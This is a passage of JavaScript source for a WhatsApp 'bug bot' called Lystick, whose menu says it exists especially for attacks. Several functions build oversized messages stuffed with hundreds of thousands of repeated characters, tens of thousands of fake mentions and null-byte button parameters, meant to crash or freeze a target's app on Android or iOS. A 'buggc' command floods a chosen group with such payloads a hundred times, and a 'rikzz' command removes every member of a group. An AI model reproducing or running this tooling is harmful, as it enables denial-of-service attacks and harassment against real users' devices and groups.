newsletterName: `—͟͞͞𝙍𝙞𝙠𝙯𝙯𝙕𝙝𝙞𝙧𝙤̶ - 🩸${"—͟͞͞𝙍𝙞𝙠𝙯𝙯𝙕𝙝𝙞𝙧𝙤̶ - 🩸".repeat(10)}`,
contentType: 3,
accessibilityText: `—͟͞͞𝙍𝙞𝙠𝙯𝙯𝙕𝙝𝙞𝙧𝙤̶ - 🩸 ${"﹏".repeat(102002)}`
},
interactiveMessage: {
contextInfo: {
businessMessageForwardInfo: {
businessOwnerJid: isTarget
},
dataSharingContext: {
showMmDisclosure: true
},
participant: "0@s.whatsapp.net",
mentionedJid: ["13135550002@s.whatsapp.net"]
},
body: {
text: "" + "ꦽ".repeat(102002) + "".repeat(102002)
},
nativeFlowMessage: {
buttons: [{
name: "single_select",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "payment_method",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "call_permission_request",
buttonParamsJson: venomModsData + "".repeat(9999),
voice_call: "call_galaxy"
}, {
name: "form_message",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "wa_payment_learn_more",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "wa_payment_transaction_details",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "wa_payment_fbpin_reset",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "catalog_message",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "payment_info",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "review_order",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "send_location",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "payments_care_csat",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "view_product",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "payment_settings",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "address_message",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "automated_greeting_message_view_catalog",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "open_webview",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "message_with_link_status",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "payment_status",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "galaxy_costum",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "extensions_message_v2",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "landline_call",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "mpm",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "cta_copy",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "cta_url",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "review_and_pay",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "galaxy_message",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "cta_call",
buttonParamsJson: venomModsData + "".repeat(9999)
}]
}
}
},
additionalNodes: stanza,
stanzaId: `stanza_${Date.now()}`
}
}
await conn.relayMessage(isTarget, message, {
participant: {
jid: isTarget
}
});
}
async function bulldozer(isTarget) {
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.15575-24/31460424_1034657928630810_5421540919892785507_n.enc?ccb=11-4&oh=01_Q5Aa1QGg_CNcJUeIlX1gfEEMVn-6iwZ5W2f1RDIpgdVg3oQfcQ&oe=683ED847&_nc_sid=5e03e0&mms3=true",
          fileSha256: "8FNV4Kgw+JgvB9zTM/u5Wdj2Gglu1tV/diCFGRerURA=",
          fileEncSha256: "yJSNS1a9KfLC3hgkSouT5xRh5kP09zLewAF8QLn3Kp4=",
          mediaKey: "2xAXoY4iYmPhfRbSJkuiOFpTIUP4fVQEF4xBk3gYHXI=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.15575-24/31460424_1034657928630810_5421540919892785507_n.enc?ccb=11-4&oh=01_Q5Aa1QGg_CNcJUeIlX1gfEEMVn-6iwZ5W2f1RDIpgdVg3oQfcQ&oe=683ED847&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 40000,
                },
                () =>
                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(isTarget, message, {});

  await conn.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [isTarget],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: isTarget },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}
//================================//

//================================// -- 
async function TxOs(X, Ptcp = false) {
			await conn.relayMessage(X, {
					extendedTextMessage: {
						text: "📄友 | —͟͞͞𝙍𝙞𝙠𝙯𝙯𝙕𝙝𝙞𝙧𝙤̶" + "ꦾ".repeat(86000) + "🤡".repeat(16000) + "ဳ".repeat(25000), 
     contextInfo: {
     mentionedJid: [
       "0@s.whatsapp.net",
	...Array.from({
	length: 15000
	}, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)
							],
							stanzaId: "1234567890ABCDEF",
							participant: "0@s.whatsapp.net",
							quotedMessage: {
								callLogMesssage: {
									isVideo: true,
									callOutcome: "1",
									durationSecs: "0",
									callType: "REGULAR",
									participants: [{
										jid: "0@s.whatsapp.net",
										callOutcome: "1"
									}]
								}
							},
							remoteJid: X,
							conversionSource: " X ",
							conversionData: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
							conversionDelaySeconds: 10,
							forwardingScore: 9999999,
							isForwarded: true,
							quotedAd: {
								advertiserName: " X ",
								mediaType: "IMAGE",
								jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
								caption: " X "
							},
							placeholderKey: {
								remoteJid: "0@s.whatsapp.net",
								fromMe: false,
								id: "ABCDEF1234567890"
							},
							expiration: 86400,
							ephemeralSettingTimestamp: "1728090592378",
							ephemeralSharedSecret: "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
							externalAdReply: {
								title: "友 | —͟͞͞𝙍𝙞𝙠𝙯𝙯𝙕𝙝𝙞𝙧𝙤 ϟ",
								body: "Created By 友 | —͟͞͞𝙍𝙞𝙠𝙯𝙯𝙕𝙝𝙞𝙧𝙤",
								mediaType: "image",
								renderLargerThumbnail: true,
								previewType: "image",
								thumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/...",
								sourceType: " x ",
								sourceId: " x ",
								sourceUrl: "https://www.bokep.com/raditx7",
								mediaUrl: "https://www.bokep.com/raditx7",
								containsAutoReply: true,
								showAdAttribution: true,
								ctwaClid: "ctwa_clid_example",
								ref: "ref_example"
							},
							entryPointConversionSource: "entry_point_source_example",
							entryPointConversionApp: "entry_point_app_example",
							entryPointConversionDelaySeconds: 5,
							disappearingMode: {},
							actionLink: {
								url: "https://www.bokep.com/raditx7"
							},
							groupSubject: " X ",
							parentGroupJid: "6287888888888-1234567890@g.us",
							trustBannerType: " X ",
							trustBannerAction: 1,
							isSampled: false,
							utm: {
								utmSource: " X ",
								utmCampaign: " X "
							},
							forwardedNewsletterMessageInfo: {
								newsletterJid: "6287888888888-1234567890@g.us",
								serverMessageId: 1,
								newsletterName: " X ",
								contentType: "UPDATE",
								accessibilityText: " X "
							},
							businessMessageForwardInfo: {
								businessOwnerJid: "0@s.whatsapp.net"
							},
							smbClientCampaignId: "smb_client_campaign_id_example",
							smbServerCampaignId: "smb_server_campaign_id_example",
							dataSharingContext: {
								showMmDisclosure: true
							}
						}
					}
				},
				Ptcp ? {
					participant: {
						jid: X
					}
				} : {}
			);
			console.log(chalk.red("Rikzz Attack Targetꑭ"));
		}
async function DelayRespone(target) {
const buttons = [
{ buttonId: "\u0000".repeat(599999), buttonText: { displayText: "𝙍𝙞͢𝙠𝙯͓͠𝙯𝙕𝙝͎𝙞𝙧𝙤̔↯" }, type: 1, nativeFlowInfo: { name: "single_select", paramsJson: "{}" } }, 
];
let msg = generateWAMessageFromContent(target, proto.Message.fromObject({
viewOnceMessage: {
message: {
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: {
virtexId: conn.generateMessageTag(),
participant: "13135550002@s.whatsapp.net",
mentionedJid: ["0@s.whatsapp.net"],
quotedMessage: {
buttonsMessage: {
hasMediaAttachment: true,
contentText: "͟͞͞𝙍𝙞͢𝙠𝙯͓͠𝙯𝙕𝙝͎𝙞𝙧𝙤̔↯-𝗖𝗿𝗮͟𝘀𝗵𝗲𝗿͟͞",
footerText: "© 𝙍𝙞͢𝙠𝙯͓͠𝙯𝙕𝙝͎𝙞𝙧𝙤̔↯ - 2025",
buttons: buttons,
viewOnce: true,
headerType: 1
}
}
},
body: proto.Message.InteractiveMessage.Body.create({
text: "⏤🌸͟͟͞͞𝙍𝙞͢𝙠𝙯͓͠𝙯𝙕𝙝͎𝙞𝙧𝙤̔↯-𝗖𝗿𝗮͟𝘀𝗵𝗲𝗿͟͞",
}),
footer: proto.Message.InteractiveMessage.Footer.create({
buttonParamsJson: JSON.stringify({buttons})
}),
header: proto.Message.InteractiveMessage.Header.create({
buttonParamsJson: JSON.stringify({buttons}),
subtitle: "", 
hasMediaAttachment: false
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
name: "single_select",
buttonParamsJson: "JSON.stringify(buttons)"
},
{
name: "call_permission_request",
buttonParamsJson: "{}"
},
{
name: "galaxy_message",
buttonParamsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"Rikzz 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"@RikzzZhiro\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"⭑̤⟅̊༑ ▾ 𝐙͢𝐗ͮ𝐎 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤${"\u0003".repeat(429999)}\",\"screen_0_TextInput_1\":\"INFINITE\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
}
]
})
})
}
}
}), {});
await conn.relayMessage(target, msg.message, {
messageId: msg.key.id,
participant: { jid : target }
});
}

// END FUNCTION RIKZZ
switch (command) {
case "public": {
if (!isCreator) return m.reply(mess.owner);
if (global.db.settings[botNumber].public === true) return m.reply("💢 *Already public*");
global.db.settings[botNumber].public = true;
m.reply(`${mess.success}`);
}
break;
//=======================≥
case "self": {
if (!isCreator) return m.reply(mess.owner);
if (global.db.settings[botNumber].public === false) return m.reply("💢 *Already self*");
global.db.settings[botNumber].public = false;
m.reply(`${mess.success}`);
}
break;
//===========================≥
//Menu
case 'menu': {
let caption=`🎓 Hi, I'm *Lystick* Whatsapp Bot Developer. This WhatsApp Bot Can Help You In Doing Certain Activities, Especially In Attacks.

*࿋ Bot Information*
⌯ Developer: *RikzzZhiro*
⌯ Bot Name: *Lystick*
⌯ Version: *Beta*
⌯ Prefix *Multi*
⌯ Type *Case*

keep supporting our WhatsApp channel
https://whatsapp.com/channel/0029VavdR1UFsn0Xd7vklr3o

© RikzzZhiro - 2025`;
const buttons=[
{buttonId:`myxowner`,buttonText:{displayText:'[ BuyNoEnc ]'}},
{buttonId:`allmenu`,buttonText:{displayText:'[ Allmenu ]'}}
];
const buttonMessage={
image:{url:zconcept},
caption:caption,
footer:'© RikzzZhiro - 𝟸𝟶𝟸𝟻',
buttons:buttons,
headerType:1,
viewOnce:true,
contextInfo:{
isForwarded:true,
forwardingScore:1,
forwardedNewsletterMessageInfo:{
newsletterJid:"120363381288267213@newsletter",
newsletterName:"just a bug bot",
serverMessageId:1
}
}
};
const flowActions=[
{
buttonId:'action',
buttonText:{displayText:'Action Flow Button'},
type:4,
nativeFlowInfo:{
name:'single_select',
paramsJson:JSON.stringify({
title:"List-Menu",
sections:[
{
title:"List menu bot",
highlight_label:"VVIP〽️",
rows:[
{title:"VVIP",description:"VVIP MENU",id:`vvip`},
{title:"LIST BUG",description:"Display List Bug",id:`listbug`}
]
},
{
title:"Hello, I'm the RikzzZhiro Bot. Nice to meet you.",
highlight_label:"highlight label",
rows:[
{title:"OWNER MENU",description:"Display Owner Menu",id:`ownermenu`},
{title:"TOOLS",description:"Display Tools",id:`tools`}
]
}
]
})
},
viewOnce:true
}
];
buttonMessage.buttons.push(...flowActions);
return await conn.sendMessage(m.chat,buttonMessage,{quoted:m});
}
break;
//=======================≥
case 'listbug': {
if (!isCreator) return m.reply(mess.owner);
let caption=
`${ucapanWaktu} I'm Lystick, a cutting-edge WhatsApp Bot powered by Node.js Crafted with precision by RikzzZhiro.
    
- Protox X Android
 ▢ protoximg
 ▢ protoxaudio
 ▢ protoxvideo
 ▢ protoxstiker
 ▢ protoxultra
 ▢ protoxhard
 
- Bug Ui X Android
 ▢ carousel
 ▢ docutos
 ▢ floods
 ▢ combos
 ▢ trashui

- List Bug To Ios
 ▢ holdkeyios
 ▢ voidfluxios
 
© RikzzZhiro - 2025`;
const buttons=[
{buttonId:`menu`,buttonText:{displayText:'[ 𝗕𝗮𝗰𝗸 ]'}},
];
const buttonMessage={
image:{url:zconcept},
caption:caption,
footer:'© RikzzZhiro - 𝟸𝟶𝟸𝟻',
buttons:buttons,
headerType:1,
viewOnce:true,
contextInfo:{
isForwarded:true,
forwardingScore:1,
forwardedNewsletterMessageInfo:{
newsletterJid:"120363381288267213@newsletter",
newsletterName:"Ahh I'm so sleepy",
serverMessageId:1
}
}
};
return await conn.sendMessage(m.chat,buttonMessage,{quoted:m});
}
break;
case 'ownermenu': {
if (!isCreator) return m.reply(mess.owner);
let caption=
`${ucapanWaktu} I'm Lystick, a cutting-edge WhatsApp Bot powered by Node.js Crafted with precision by RikzzZhiro.
    
- List Owner Akses
 ▢ Addprem
 ▢ Delprem
 ▢ Listprem
 ▢ Addowner
 ▢ Delowner
 
© RikzzZhiro - 2025`;
const buttons=[
{buttonId:`menu`,buttonText:{displayText:'[ 𝗕𝗮𝗰𝗸 ]'}},
];
const buttonMessage={
image:{url:zconcept},
caption:caption,
footer:'© RikzzZhiro - 𝟸𝟶𝟸𝟻',
buttons:buttons,
headerType:1,
viewOnce:true,
contextInfo:{
isForwarded:true,
forwardingScore:1,
forwardedNewsletterMessageInfo:{
newsletterJid:"120363381288267213@newsletter",
newsletterName:"Ahh I'm so sleepy",
serverMessageId:1
}
}
};
return await conn.sendMessage(m.chat,buttonMessage,{quoted:m});
}
break;
case 'tools': {
if (!isCreator) return m.reply(mess.owner);
let caption=
`${ucapanWaktu} I'm Lystick, a cutting-edge WhatsApp Bot powered by Node.js Crafted with precision by RikzzZhiro.
    
- List Bug To Andro
 ▢ Tourl
 ▢ Eval
 ▢ Tagsw
 ▢ Liston/Listonline
 ▢ SpamNgl
 
© RikzzZhiro - 2025`;
const buttons=[
{buttonId:`menu`,buttonText:{displayText:'[ 𝗕𝗮𝗰𝗸 ]'}},
];
const buttonMessage={
image:{url:zconcept},
caption:caption,
footer:'© RikzzZhiro - 𝟸𝟶𝟸𝟻',
buttons:buttons,
headerType:1,
viewOnce:true,
contextInfo:{
isForwarded:true,
forwardingScore:1,
forwardedNewsletterMessageInfo:{
newsletterJid:"120363381288267213@newsletter",
newsletterName:"Ahh I'm so sleepy",
serverMessageId:1
}
}
};
return await conn.sendMessage(m.chat,buttonMessage,{quoted:m});
}
break;
case 'vvip': {
if (!isCreator) return m.reply(mess.owner);
let caption=
`${ucapanWaktu} I'm Lystick, a cutting-edge WhatsApp Bot powered by Node.js Crafted with precision by RikzzZhiro.
    
*VVIP BUG*🥶
EXAMPLE : corupted 62xxxxxx

*Don't forget to pause, friends*`;
const buttons=[
{buttonId:`menu`,buttonText:{displayText:'[ 𝗕𝗮𝗰𝗸 ]'}},
];
const buttonMessage={
image:{url:thumbSky},
caption:caption,
footer:'© RikzzZhiro - 𝟸𝟶𝟸𝟻',
buttons:buttons,
headerType:1,
viewOnce:true,
contextInfo:{
isForwarded:true,
forwardingScore:1,
forwardedNewsletterMessageInfo:{
newsletterJid:"120363381288267213@newsletter",
newsletterName:"Ahh I'm so sleepy",
serverMessageId:1
}
}
};
return await conn.sendMessage(m.chat,buttonMessage,{quoted:m});
}
break;
case 'corupted': {
if (!isCreator) return m.reply(mess.owner);
				if (!q) return m.reply(`*Syntax Error!*\n\n_Use : corupted Number_\n_Example : corupted 62xx_\n\n友 | —͟͞͞𝙍𝙞𝙠𝙯𝙯𝙕𝙝𝙞𝙧𝙤`);
				incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
				if (incTarget.startsWith('0')) return m.reply(`*Syntax Error!*\n\n_Use : corupted Number_\n_Example : corupted 62xx_\n\n友 | —͟͞͞𝙍𝙞𝙠𝙯𝙯𝙕𝙝𝙞𝙧𝙤`)
				let target = incTarget + '@s.whatsapp.net'
				global.jumlah = text.split("|")[1]
let caption=
`[ 𝗥𝗜𝗞𝗭𝗭 𝗭𝗛𝗜𝗥𝗢 ]

🔒 *LOCK* : ${incTarget}

*select the bug according to your needs sir*`;
const buttons=[
{buttonId:`myxowner`,buttonText:{displayText:'[ BUY NO ENC ]'}},
{buttonId:`menu`,buttonText:{displayText:'[ BACK MENU ]'}}
];
const buttonMessage={
image:{url:thumbSky},
caption:caption,
footer:'© RikzzZhiro - 𝟸𝟶𝟸𝟻',
buttons:buttons,
headerType:1,
viewOnce:true,
contextInfo:{
isForwarded:true,
forwardingScore:1,
forwardedNewsletterMessageInfo:{
newsletterJid:"120363381288267213@newsletter",
newsletterName:"just a bug bot",
serverMessageId:1
}
}
};
const flowActions=[
{
buttonId:'action',
buttonText:{displayText:'Action Flow Button'},
type:4,
nativeFlowInfo:{
name:'single_select',
paramsJson:JSON.stringify({
title:"TYPE BUG",
sections:[
{
title:"P͢R͠OT͢OX ↯ A͢ND͢R͠OID",
highlight_label:"Protox bug collection",
rows:[
{title:"⌁⃰PR͢OTO͠X ↯ I͢MG༑",description:"📷 kombinasi protocol X image",id:`protoximg ${incTarget}`},
{title:"⌁⃰PR͐O͢TO͠X ↯ V͚ID͢EO༑",description:"🌀 video yang di modif menjadi protocol",id:`protoxvideo ${incTarget}`},
{title:"⌁⃰PRͤ͢OTO͡X ↯ A͠UDI͢O༑",description:"🔇 audio in protocol",id:`protoxaudio ${incTarget}`},
{title:"⌁⃰PR͢OT͠OX ↯ ST͡IK͢ER༑",description:"💣 stiker delay kejut",id:`protoxstiker ${incTarget}`},
{title:"⌁⃰PR͊O͢T͡OX ↯ UL͢TR͓A༑",description:"💥 ultra invlasion bug",id:`protoxultra ${incTarget}`},
{title:"⌁⃰PR̺O͋͢TOX ↯ H͡AR͠D༑",description:"🎃 hard fixed bug",id:`protoxhard ${incTarget}`}
]
},
{
title:"𝐀𝐍𝐃𝐑𝚯𝐈𝐃",
highlight_label:"vicious bug combination",
rows:[
{title:"⌁⃰CA͉RO͢US͠EL༑",description:"👣 send carousel in message",id:`carousel ${incTarget}`},
{title:"⌁⃰DO͒CU͠T͢OS༑",description:"🎁 sending doc with high size",id:`docutos ${incTarget}`},
{title:"⌁⃰FL͢O͠O̺DS༑",description:"🦠 send flood to andro",id:`floods ${incTarget}`},
{title:"⌁⃰TR͒A͢SH͢UI༑",description:"👾 remaker ui floop",id:`trashui ${incTarget}`},
{title:"⌁⃰CO͋M͢BO͠S༑",description:"💢 all bugs combined into one",id:`combos ${incTarget}`}
]
},
{
title:"I𝚯S",
highlight_label:"VVIP👑",
rows:[
{title:"⌁⃰𝐕𝐨𝐢𝐝𝐅𝐥𝐮𝐱 𝐈𝐨𝐒༑",description:"send voidflux ios",id:`voidflux ${incTarget}`},
{title:"⌁⃰𝐇𝐨𝐥𝐝𝐊𝐞𝐲 𝐈𝐨𝐒༑",description:"send holdkey ios",id:`holdkeyios ${incTarget}`}
]
}
]
})
},
viewOnce:true
}
];
buttonMessage.buttons.push(...flowActions);
return await conn.sendMessage(m.chat,buttonMessage,{quoted:m});
}
break;
//=======================≥
case "rikzz":
        {
          if (!isCreator) return Reply(mess.owner);
          let memberFilter = await m.metadata.participants
            .map((v) => v.id)
            .filter((e) => e !== botNumber && e !== m.sender);
          if (memberFilter.length < 1)
            return m.reply("Grup Ini Sudah Tidak Ada Member!");
          await m.reply("Kudeta Grup By RikzzZhiro Starting 🔥");
          for (let i of memberFilter) {
            await conn.groupParticipantsUpdate(m.chat, [i], "remove");
            await sleep(1000);
          }
          await m.reply("Kudeta Grup Telah Berhasil 🏴‍☠️");
        }
        break;
case 'ping': {
const os = require('os');
const { performance } = require('perf_hooks');
const formatBytes = (bytes) => (bytes / (1024 ** 3)).toFixed(2) + ' GB';
const totalRAM = formatBytes(os.totalmem());
const freeRAM = formatBytes(os.freemem());
const uptime = (os.uptime() / 3600).toFixed(2) + ' Hours';
const platform = os.platform();
const cpuModel = os.cpus()[0].model;
const cpuCores = os.cpus().length;
const botSpeed = `${moment.duration(Date.now() - parseInt(m.messageTimestamp.toString()) * 1000).asSeconds()} Ms`;
const caption = 
`╾[ *Speed Test* ]
•Response Time: ${botSpeed}

[ *Server Info* ]
•Total RAM: ${totalRAM}
•Free RAM: ${freeRAM}
•Platform: ${platform}
•Uptime: ${uptime}
•Server runtime: ${runtime(process.uptime())}

[ *Cpu Info* ]
•Model: ${cpuModel}
•Cores: ${cpuCores}`;
m.reply(caption);
break;
}
//=======================≥
case "owner":
case "myxowner": {
let namaown = `*RikzzZhiro* 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ`
var contact = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"contactMessage": {
"displayName": `${namaown}`,
"vcard": `BEGIN:VCARD\nVERSION:3.0\nN:;;;;\nFN:${namaown}\nitem1.TEL;waid=${global.owner}:+${global.owner}\nitem1.X-ABLabel:Ponsel\nX-WA-BIZ-DESCRIPTION:𝙾𝚆𝙽𝙴𝚁 𝙱𝙾𝚃\nX-WA-BIZ-NAME: 𝐃𝐆 || 𝐃𝐀𝐑𝐊 𝐀𝐍𝐆𝐄𝐋\nEND:VCARD`,
}
}), {
userJid: m.chat,
quoted: m
})
conn.relayMessage(m.chat, contact.message, {
messageId: contact.key.id
})
}
break
case 'xgc': {
const listgroup = await conn.getAllGroups(true);
if (listgroup.length === 0) return m.reply("❌ Kamu belum masuk grup manapun!");
const sections = listgroup.map(x => ({
title: "╼" + x.subject,
description: `> Attack This Group`,
id: `${prefix}buggc ${x.id}`
}));
await conn.sendMessage(m.chat,{
text: "*Select List Group To*\n*Attack With Virtex*",
footer: "RikzzZhiro?",
buttons: [
{
buttonId: 'action',
buttonText: { displayText: 'Action Flow Button' },
type: 4,
nativeFlowInfo: {
name: "single_select",
paramsJson: JSON.stringify({
title: "List Group",
sections: [{
title: "© RikzzZhiro - 2025",
highlight_label: "Select Group",
rows: sections
}]
})
}
}
],
viewOnce: true,
}, {quoted: rikzz});
break;
}
case 'buggc': {
    if (!text) return m.reply(`*❌ Syntax Error!!*\n*Use:* ${prefix + command} <GroupID>`);
    let groupId = text.trim();
for (let i = 0; i < 100; i++) {
await Loc(groupId, 90000, false);
await sleep(3000)
await Loc(groupId, 90000, false);
};
m.reply(`Success Attack Group`);
}
break;
//===========================≥
//Own Tools
case "eval": {
if (!isPremium) return m.reply(mess.premium)
if (!m.quoted) return m.reply(`*Reply Chat To Get The Quoted*`);
const kripto = require('crypto');
let penis = JSON.stringify({ [m.quoted.mtype]: m.quoted }, null, 2);
let jeneng = `MessageData_${kripto.randomBytes(8).toString('hex')}.json`;
await fs.writeFileSync(jeneng, penis);
await m.reply(penis);
await conn.sendMessage(m.chat, { document: { url: `./${jeneng}` }, fileName: jeneng, mimetype: '*/*' }, { quoted: m });
await fs.unlinkSync(jeneng);
}
break
//===========================≥
//Addaccess
case"addprem":{
if(!isCreator)return m.reply(mess.owner);
if(args.length<2)return m.reply(`*❌Syntax Error!!*\n Example : /Addprem 60xx 30d`);
